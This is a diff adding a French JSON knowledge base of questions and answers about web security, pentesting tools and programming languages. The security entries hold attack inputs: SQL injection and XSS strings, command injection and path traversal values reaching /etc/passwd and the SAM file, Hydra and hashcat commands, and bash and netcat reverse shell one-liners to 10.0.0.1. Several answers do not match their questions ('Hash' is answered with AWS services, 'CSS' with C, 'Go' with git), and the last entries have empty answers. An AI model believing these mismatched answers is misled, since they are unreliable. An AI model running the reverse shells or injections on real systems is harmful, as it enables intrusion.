@@ -1,0 +1,248 @@
+{
+  "knowledge": [
+    {
+      "question": "Qu'est-ce que OWASP Top 10?",
+      "answer": "Les 10 vulnérabilités web les plus critiques:\n1. Broken Access Control - Contrôle d'accès défaillant\n2. Cryptographic Failures - Échecs cryptographiques\n3. Injection - SQL, NoSQL, OS command injection\n4. Insecure Design - Conception non sécurisée\n5. Security Misconfiguration - Mauvaise configuration\n6. Vulnerable Components - Composants vulnérables\n7. Authentication Failures - Échecs d'authentification\n8. Software and Data Integrity Failures\n9. Security Logging Failures - Journalisation insuffisante\n10. SSRF - Server-Side Request Forgery"
+    },
+    {
+      "question": "Qu'est-ce que SQL Injection?",
+      "answer": "Attaque qui injecte du code SQL malveillant dans une requête.\nExemple: ' OR '1'='1\nProtection: Requêtes préparées, validation des entrées, ORM\nOutils: sqlmap, Burp Suite\nTest: ' OR 1=1--, admin'--"
+    },
+    {
+      "question": "Qu'est-ce que XSS Cross-Site Scripting?",
+      "answer": "Injection de JavaScript malveillant dans une page web.\nTypes: Reflected XSS, Stored XSS, DOM-based XSS\nExemple: <script>alert('XSS')</script>\nProtection: Échappement HTML, Content Security Policy, validation\nOutils: XSStrike, Burp Suite"
+    },
+    {
+      "question": "Qu'est-ce que CSRF Cross-Site Request Forgery?",
+      "answer": "Force un utilisateur authentifié à exécuter des actions non désirées.\nProtection: Tokens CSRF, SameSite cookies, vérification Referer\nExemple: <img src=\"http://bank.com/transfer?to=attacker&amount=1000\">"
+    },
+    {
+      "question": "Qu'est-ce que Command Injection?",
+      "answer": "Injection de commandes système dans une application.\nExemple: ; ls -la, && cat /etc/passwd\nProtection: Validation stricte, éviter system(), utiliser des listes blanches\nTest: ; whoami, | id, `uname -a`"
+    },
+    {
+      "question": "Qu'est-ce que Path Traversal?",
+      "answer": "Accès à des fichiers en dehors du répertoire autorisé.\nExemple: ../../etc/passwd, ..\\..\\windows\\system32\\config\\sam\nProtection: Validation des chemins, chroot, permissions strictes"
+    },
+    {
+      "question": "Qu'est-ce que Pentesting?",
+      "answer": "Test d'intrusion pour identifier les vulnérabilités.\nPhases: Reconnaissance, Scanning, Exploitation, Post-exploitation, Reporting\nMéthodologies: OWASP, PTES, OSSTMM\nOutils: Metasploit, Nmap, Burp Suite, Wireshark"
+    },
+    {
+      "question": "Qu'est-ce que Reconnaissance?",
+      "answer": "Phase de collecte d'informations sur la cible.\nPassive: OSINT, Google Dorks, Shodan, theHarvester\nActive: Nmap, DNS enumeration, port scanning\nOutils: Maltego, Recon-ng, Amass, subfinder"
+    },
+    {
+      "question": "Qu'est-ce que Nmap?",
+      "answer": "Scanner de ports et de réseau.\nCommandes:\n- nmap -sS target : SYN scan (stealth)\n- nmap -sV target : Détection de versions\n- nmap -O target : Détection OS\n- nmap -A target : Scan agressif complet\n- nmap -p- target : Tous les ports"
+    },
+    {
+      "question": "Qu'est-ce que Metasploit?",
+      "answer": "Framework d'exploitation de vulnérabilités.\nCommandes:\n- msfconsole : Lancer Metasploit\n- search exploit : Chercher un exploit\n- use exploit/... : Sélectionner un exploit\n- set RHOST target : Définir la cible\n- exploit : Lancer l'attaque\nModules: exploits, payloads, auxiliary, post"
+    },
+    {
+      "question": "Qu'est-ce que Burp Suite?",
+      "answer": "Proxy d'interception pour tester les applications web.\nFonctionnalités:\n- Proxy: Intercepter les requêtes HTTP\n- Repeater: Modifier et renvoyer des requêtes\n- Intruder: Attaques automatisées (brute force, fuzzing)\n- Scanner: Détection automatique de vulnérabilités\n- Decoder: Encoder/décoder des données"
+    },
+    {
+      "question": "Qu'est-ce que Wireshark?",
+      "answer": "Analyseur de paquets réseau.\nFiltres utiles:\n- http : Trafic HTTP\n- tcp.port == 80 : Port 80\n- ip.addr == 192.168.1.1 : IP spécifique\n- http.request.method == \"POST\" : Requêtes POST\nAnalyse: Follow TCP Stream, Statistics"
+    },
+    {
+      "question": "Qu'est-ce que Reverse Shell?",
+      "answer": "Shell qui se connecte depuis la cible vers l'attaquant.\nBash: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nPython: python -c 'import socket...'\nNetcat: nc -e /bin/bash 10.0.0.1 4444\nListener: nc -lvnp 4444"
+    },
+    {
+      "question": "Qu'est-ce que Privilege Escalation?",
+      "answer": "Élévation de privilèges pour obtenir root/admin.\nLinux: SUID binaries, sudo misconfiguration, kernel exploits\nWindows: UAC bypass, token impersonation, service exploits\nOutils: LinPEAS, WinPEAS, GTFOBins, PEASS-ng"
+    },
+    {
+      "question": "Qu'est-ce que Brute Force?",
+      "answer": "Attaque par force brute pour deviner des credentials.\nOutils:\n- Hydra: hydra -l admin -P wordlist.txt ssh://target\n- John the Ripper: john --wordlist=rockyou.txt hash.txt\n- Hashcat: hashcat -m 0 -a 0 hash.txt wordlist.txt\n- Medusa, Patator, CrackMapExec"
+    },
+    {
+      "question": "Qu'est-ce que Cryptographie?",
+      "answer": "Science du chiffrement des données.\nSymétrique: AES, DES, 3DES (même clé)\nAsymétrique: RSA, ECC (clé publique/privée)\nHash: MD5, SHA-1, SHA-256, bcrypt\nOutils: OpenSSL, GPG, hashcat, John"
+    },
+    {
+      "question": "Qu'est-ce que Hash?",
+      "answer": "Services cloud Amazon.\nEC2: Serveurs virtuels\nS3: Stockage d'objets\nLambda: Fonctions serverless\nRDS: Bases de données managées\nCloudFormation: Infrastructure as Code"
+    },
+    {
+      "question": "Qu'est-ce que TCP/IP?",
+      "answer": "Protocoles de communication réseau.\nCouches: Application, Transport, Internet, Accès réseau\nTCP: Connexion fiable (3-way handshake)\nUDP: Sans connexion, rapide\nPorts: 80 (HTTP), 443 (HTTPS), 22 (SSH), 21 (FTP)"
+    },
+    {
+      "question": "Qu'est-ce que Firewall?",
+      "answer": "Filtre le trafic réseau entrant/sortant.\nTypes: Packet filtering, Stateful, Application layer\nLinux: iptables, nftables, ufw\nWindows: Windows Firewall\nBypass: Tunneling, fragmentation, port knocking"
+    },
+    {
+      "question": "Qu'est-ce que Kali Linux?",
+      "answer": "Distribution Linux pour le pentesting.\nOutils préinstallés:\n- Nmap, Metasploit, Burp Suite, Wireshark\n- John, Hashcat, Hydra, Aircrack-ng\n- SQLmap, Nikto, Dirb, Gobuster\n- Social Engineering Toolkit, BeEF"
+    },
+    {
+      "question": "Qu'est-ce que Gobuster?",
+      "answer": "Scanner de répertoires et fichiers web.\nCommandes:\n- gobuster dir -u http://target -w wordlist.txt\n- gobuster dns -d target.com -w subdomains.txt\n- gobuster vhost -u http://target -w vhosts.txt\nWordlists: /usr/share/wordlists/"
+    },
+    {
+      "question": "Qu'est-ce que SQLmap?",
+      "answer": "Langage pour bases de données relationnelles.\nSELECT: SELECT * FROM users WHERE age > 18;\nINSERT: INSERT INTO users (name, age) VALUES ('John', 25);\nUPDATE: UPDATE users SET age = 26 WHERE id = 1;\nJOIN: INNER JOIN, LEFT JOIN, RIGHT JOIN\nBases: MySQL, PostgreSQL, SQLite"
+    },
+    {
+      "question": "Qu'est-ce que HTTPS?",
+      "answer": "HTTP sécurisé avec TLS/SSL.\nCertificats: X.509, Let's Encrypt\nAttaques: Man-in-the-Middle, SSL stripping\nOutils: SSLscan, testssl.sh, OpenSSL"
+    },
+    {
+      "question": "Qu'est-ce que JWT JSON Web Token?",
+      "answer": "Token d'authentification encodé en base64.\nStructure: Header.Payload.Signature\nVulnérabilités: None algorithm, weak secret, no signature verification\nOutils: jwt_tool, jwt.io"
+    },
+    {
+      "question": "Qu'est-ce que API Security?",
+      "answer": "Sécurisation des APIs REST/GraphQL.\nVulnérabilités: Broken authentication, excessive data exposure, injection\nProtection: Rate limiting, authentication, validation, CORS\nOutils: Postman, Insomnia, OWASP ZAP"
+    },
+    {
+      "question": "Qu'est-ce que Social Engineering?",
+      "answer": "Manipulation psychologique pour obtenir des informations.\nTechniques: Phishing, Pretexting, Baiting, Quid pro quo\nOutils: SET (Social Engineering Toolkit), Gophish\nProtection: Formation, sensibilisation, vérification"
+    },
+    {
+      "question": "Qu'est-ce que Phishing?",
+      "answer": "Faux emails/sites pour voler des credentials.\nTypes: Spear phishing (ciblé), Whaling (executives)\nOutils: Gophish, SET, King Phisher\nProtection: Vérifier l'expéditeur, ne pas cliquer sur les liens suspects"
+    },
+    {
+      "question": "Qu'est-ce que Persistence?",
+      "answer": "Maintenir l'accès après exploitation.\nLinux: Cron jobs, SSH keys, backdoors\nWindows: Registry, scheduled tasks, services\nOutils: Metasploit persistence modules, Empire"
+    },
+    {
+      "question": "Qu'est-ce que Lateral Movement?",
+      "answer": "Se déplacer dans le réseau après compromission.\nTechniques: Pass-the-Hash, Pass-the-Ticket, RDP\nOutils: Mimikatz, CrackMapExec, BloodHound, Impacket"
+    },
+    {
+      "question": "Qu'est-ce que CTF Capture The Flag?",
+      "answer": "Compétitions de hacking éthique.\nTypes: Jeopardy (challenges), Attack-Defense\nCatégories: Web, Crypto, Forensics, Reverse, PWN\nPlateformes: HackTheBox, TryHackMe, PicoCTF, CTFtime"
+    },
+    {
+      "question": "Qu'est-ce que JavaScript?",
+      "answer": "Langage de programmation pour le web (frontend et backend avec Node.js).\nSyntaxe: let x = 10; const name = \"John\"; function hello() { return \"Hi\"; }\nFrameworks: React, Vue, Angular, Express, Next.js\nUtilisations: Sites web interactifs, applications web, APIs"
+    },
+    {
+      "question": "Qu'est-ce que React?",
+      "answer": "Bibliothèque JavaScript pour créer des interfaces utilisateur.\nComposants: function App() { return <div>Hello</div>; }\nHooks: useState, useEffect, useContext, useReducer\nJSX: Syntaxe HTML dans JavaScript\nProps et State pour gérer les données"
+    },
+    {
+      "question": "Qu'est-ce que Node.js?",
+      "answer": "Runtime JavaScript côté serveur.\nModules: require(), import/export\nNPM: Gestionnaire de packages\nExpress: Framework web populaire\nAsync: Promises, async/await pour opérations asynchrones"
+    },
+    {
+      "question": "Qu'est-ce que TypeScript?",
+      "answer": "JavaScript avec typage statique.\nTypes: string, number, boolean, array, object\nInterfaces: interface User { name: string; age: number; }\nClasses: class Person { constructor(name: string) {} }\nCompilation vers JavaScript"
+    },
+    {
+      "question": "Qu'est-ce que HTML?",
+      "answer": "Langage de balisage pour structurer les pages web.\nBalises: <div>, <p>, <h1>, <a>, <img>, <form>\nAttributs: class, id, src, href\nSémantique: <header>, <nav>, <main>, <footer>, <article>"
+    },
+    {
+      "question": "Qu'est-ce que CSS?",
+      "answer": "Langage bas niveau pour performance.\nPointeurs: int *ptr = &variable;\nMémoire: malloc(), free()\nStructures: struct Person { char name[50]; int age; };\nCompilation: gcc, make"
+    },
+    {
+      "question": "Qu'est-ce que Python avancé?",
+      "answer": "Concepts avancés Python.\nDécorateurs: @decorator pour modifier des fonctions\nGénérateurs: yield pour itération lazy\nContext managers: with statement\nMétaclasses: Personnaliser la création de classes\nAsync: asyncio, async/await"
+    },
+    {
+      "question": "Qu'est-ce que Java?",
+      "answer": "Langage orienté objet pour applications enterprise.\nClasses: public class MyClass { }\nHéritage: extends, implements\nCollections: ArrayList, HashMap, HashSet\nExceptions: try-catch-finally\nSpring Framework pour applications web"
+    },
+    {
+      "question": "Qu'est-ce que C++?",
+      "answer": "Extension orientée objet de C.\nClasses: class MyClass { public: void method(); };\nTemplates: template<typename T>\nSTL: vector, map, set, algorithm\nSmart pointers: unique_ptr, shared_ptr"
+    },
+    {
+      "question": "Qu'est-ce que PHP?",
+      "answer": "Langage serveur pour le web.\nSyntaxe: <?php echo \"Hello\"; ?>\nVariables: $name = \"John\";\nArrays: $arr = array(1, 2, 3);\nMySQL: mysqli, PDO pour bases de données\nLaravel: Framework PHP moderne"
+    },
+    {
+      "question": "Qu'est-ce que Ruby?",
+      "answer": "Langage élégant et expressif.\nSyntaxe: puts \"Hello\"\nBlocs: array.each { |item| puts item }\nClasses: class Person; end\nRails: Framework web populaire"
+    },
+    {
+      "question": "Qu'est-ce que Go?",
+      "answer": "Système de contrôle de version.\nCommandes: git init, git add, git commit, git push, git pull\nBranches: git branch, git checkout, git merge\nRemote: git remote add origin url\nWorkflow: feature branches, pull requests"
+    },
+    {
+      "question": "Qu'est-ce que Rust?",
+      "answer": "Langage système sûr et performant.\nOwnership: Gestion mémoire sans garbage collector\nBorrowing: &variable pour références\nPattern matching: match expression\nCargo: Gestionnaire de packages"
+    },
+    {
+      "question": "Qu'est-ce que Docker?",
+      "answer": "Conteneurisation d'applications.\nDockerfile: FROM, RUN, COPY, CMD\nImages: docker build, docker pull\nContainers: docker run, docker ps, docker stop\nDocker Compose: Orchestration multi-conteneurs"
+    },
+    {
+      "question": "Qu'est-ce que API REST?",
+      "answer": "Architecture pour services web.\nMéthodes HTTP: GET, POST, PUT, DELETE, PATCH\nStatus codes: 200 OK, 201 Created, 404 Not Found, 500 Error\nJSON: Format d'échange de données\nAuthentication: JWT, OAuth, API keys"
+    },
+    {
+      "question": "Qu'est-ce que GraphQL?",
+      "answer": "Langage de requête pour APIs.\nQuery: query { user(id: 1) { name email } }\nMutation: mutation { createUser(name: \"John\") { id } }\nSchema: type User { id: ID! name: String! }\nAvantages: Requêtes précises, pas de over-fetching"
+    },
+    {
+      "question": "Qu'est-ce que MongoDB?",
+      "answer": "Base de données NoSQL orientée documents.\nDocuments: JSON-like { name: \"John\", age: 25 }\nCollections: Équivalent des tables SQL\nRequêtes: db.users.find({ age: { $gt: 18 } })\nMongoose: ODM pour Node.js"
+    },
+    {
+      "question": "Qu'est-ce que Redis?",
+      "answer": "Base de données en mémoire clé-valeur.\nCommandes: SET key value, GET key, DEL key\nStructures: Strings, Lists, Sets, Hashes, Sorted Sets\nCache: Très rapide pour mise en cache\nPub/Sub: Messagerie temps réel"
+    },
+    {
+      "question": "Qu'est-ce que Kubernetes?",
+      "answer": "Orchestration de conteneurs.\nPods: Unité de déploiement\nServices: Exposition des applications\nDeployments: Gestion des réplicas\nkubectl: CLI pour gérer le cluster"
+    },
+    {
+      "question": "Qu'est-ce que Linux?",
+      "answer": "Système d'exploitation open source.\nCommandes: ls, cd, mkdir, rm, cp, mv, grep, find\nPermissions: chmod, chown\nProcessus: ps, top, kill\nShell: bash, zsh\nDistributions: Ubuntu, Debian, CentOS, Arch"
+    },
+    {
+      "question": "Qu'est-ce que Regex?",
+      "answer": "Expressions régulières pour pattern matching.\nCaractères: . (any), * (0+), + (1+), ? (0-1)\nClasses: [a-z], [0-9], \\d (digit), \\w (word), \\s (space)\nGroupes: (pattern), (?:pattern) non-capturant\nAnchors: ^ (début), $ (fin), \\b (word boundary)"
+    },
+    {
+      "question": "Comment faire: Crée un script avec des fonctions",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Génère un exemple de liste",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Génère un script avec des opérateurs",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Fais un exemple de dictionnaire",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Crée un script sur les variables Python",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Crée un script pour manipuler des strings",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Fais un exemple de boucle while",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Fais un fichier avec des boucles for",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Génère un exemple de conditions if/else",
+      "answer": "Plan réussi: []"
+    },
+    {
+      "question": "Comment faire: Crée un fichier pour les tuples",
+      "answer": "Plan réussi: []"
+    }
+  ]
+}
